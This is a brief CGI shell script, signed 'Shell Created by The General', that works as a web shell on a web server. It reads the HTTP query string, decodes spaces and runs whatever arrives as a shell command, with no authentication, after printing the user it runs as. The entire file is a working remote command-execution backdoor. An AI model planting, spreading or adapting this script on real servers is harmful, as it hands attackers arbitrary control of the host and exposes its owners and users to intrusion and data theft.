#!/bin/sh
echo Content-type: text/plain
echo 
echo Shell Created by The General
echo 

#Show who you are running as:
user=`whoami`
echo "Running as user:$user"
echo 

#Read In Varibles and interprete as commands 
cmd=$QUERY_STRING

#Rewrite so we can use spaces without URL encoding being a problem
cmd2=`echo $cmd | sed 's!%20!\ !g'`

#uncomment if you want to see what is being run
#echo (`echo $QUERY_STRING | sed 's!%20!\ !g'`) 
$cmd2
$1
